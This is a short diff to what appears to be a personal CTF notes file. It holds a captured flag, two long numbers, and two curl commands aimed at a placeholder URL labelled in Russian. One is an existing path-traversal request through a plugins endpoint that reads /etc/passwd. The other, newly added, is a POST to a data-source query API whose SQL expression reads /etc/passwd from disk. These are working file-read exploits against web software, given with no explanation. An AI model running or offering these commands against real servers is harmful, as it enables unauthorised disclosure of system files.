@@ -311,3 +311,20 @@ dalCTF{WhY_$O_L0N5}
 3138922093929320898
 3100000000000000005
 curl --path-as-is "https://ТВОЙ_URL/public/plugins/welcome/../../../../../../../../etc/passwd"
+
+
+curl -X POST "https://ТВОЙ_URL/api/ds/query" \
+-H "Content-Type: application/json" \
+-d '{
+  "queries": [
+    {
+      "refId": "A",
+      "datasource": {
+        "uid": "__expr__",
+        "type": "__expr__"
+      },
+      "type": "sql",
+      "expression": "SELECT * FROM read_csv_auto('\''/etc/passwd'\'')"
+    }
+  ]
+}'
